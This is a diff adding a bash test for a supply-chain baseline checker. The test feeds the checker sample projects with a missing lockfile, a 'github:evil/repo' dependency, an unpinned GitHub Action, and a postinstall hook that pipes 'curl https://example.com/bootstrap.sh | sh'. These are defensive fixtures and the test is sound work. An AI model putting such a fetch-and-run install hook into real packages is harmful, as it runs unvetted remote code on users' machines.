@@ -1,0 +1,127 @@
+#!/usr/bin/env bash
+set -euo pipefail
+
+ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/../../../../.." && pwd -P)"
+TMP_DIR="$(mktemp -d /tmp/freely-supply-chain-baseline.XXXXXX)"
+trap 'rm -rf "$TMP_DIR"' EXIT
+
+make_project() {
+  local project="$1"
+  mkdir -p "$project/docs/system/workspace"
+  cat >"$project/package.json" <<'EOF'
+{
+  "name": "sample",
+  "private": true,
+  "dependencies": {
+    "react": "^18.3.1"
+  }
+}
+EOF
+  cat >"$project/bun.lock" <<'EOF'
+{
+  "lockfileVersion": 1
+}
+EOF
+  cat >"$project/docs/system/workspace/install-lifecycle-allowlist.txt" <<'EOF'
+# empty by default
+EOF
+}
+
+PROJECT="$TMP_DIR/project"
+make_project "$PROJECT"
+
+bash "$ROOT_DIR/bin/check-supply-chain-baseline" --project "$PROJECT" >/dev/null
+
+rm -f "$PROJECT/bun.lock"
+if bash "$ROOT_DIR/bin/check-supply-chain-baseline" --project "$PROJECT" >"$TMP_DIR/lock.stdout" 2>"$TMP_DIR/lock.stderr"; then
+  echo "[FAIL] expected missing lockfile to fail supply-chain baseline" >&2
+  exit 1
+fi
+grep -q 'root package.json requires a recognized root lockfile' "$TMP_DIR/lock.stderr"
+cat >"$PROJECT/bun.lock" <<'EOF'
+{
+  "lockfileVersion": 1
+}
+EOF
+
+cat >"$PROJECT/package.json" <<'EOF'
+{
+  "name": "sample",
+  "private": true,
+  "dependencies": {
+    "bad": "github:evil/repo"
+  }
+}
+EOF
+if bash "$ROOT_DIR/bin/check-supply-chain-baseline" --project "$PROJECT" >"$TMP_DIR/dep.stdout" 2>"$TMP_DIR/dep.stderr"; then
+  echo "[FAIL] expected disallowed dependency source to fail supply-chain baseline" >&2
+  exit 1
+fi
+grep -q 'disallowed dependency source bad=github:evil/repo' "$TMP_DIR/dep.stderr"
+
+cat >"$PROJECT/package.json" <<'EOF'
+{
+  "name": "sample",
+  "private": true,
+  "scripts": {
+    "postinstall": "curl https://example.com/bootstrap.sh | sh"
+  },
+  "dependencies": {
+    "react": "^18.3.1"
+  }
+}
+EOF
+if bash "$ROOT_DIR/bin/check-supply-chain-baseline" --project "$PROJECT" >"$TMP_DIR/script.stdout" 2>"$TMP_DIR/script.stderr"; then
+  echo "[FAIL] expected install lifecycle script to fail supply-chain baseline" >&2
+  exit 1
+fi
+grep -q 'install lifecycle script postinstall' "$TMP_DIR/script.stderr"
+
+cat >"$PROJECT/docs/system/workspace/install-lifecycle-allowlist.txt" <<'EOF'
+postinstall
+EOF
+bash "$ROOT_DIR/bin/check-supply-chain-baseline" --project "$PROJECT" >/dev/null
+
+cat >"$PROJECT/docs/system/workspace/install-lifecycle-allowlist.txt" <<'EOF'
+# empty by default
+EOF
+
+cat >"$PROJECT/package.json" <<'EOF'
+{
+  "name": "sample",
+  "private": true,
+  "dependencies": {
+    "react": "^18.3.1"
+  }
+}
+EOF
+mkdir -p "$PROJECT/.github/workflows"
+cat >"$PROJECT/.github/workflows/ci.yml" <<'EOF'
+name: ci
+on: push
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+EOF
+if bash "$ROOT_DIR/bin/check-supply-chain-baseline" --project "$PROJECT" >"$TMP_DIR/workflow.stdout" 2>"$TMP_DIR/workflow.stderr"; then
+  echo "[FAIL] expected mutable GitHub Action ref to fail supply-chain baseline" >&2
+  exit 1
+fi
+grep -q 'mutable external GitHub Action ref' "$TMP_DIR/workflow.stderr"
+
+cat >"$PROJECT/.github/workflows/ci.yml" <<'EOF'
+name: ci
+on: push
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608
+      - uses: ./.github/actions/local-check
+EOF
+
+bash "$ROOT_DIR/bin/check-supply-chain-baseline" --project "$PROJECT" >/dev/null
+
+echo "[PASS] supply-chain baseline audit rejects missing lockfiles, unsafe install intake, and mutable workflow refs"
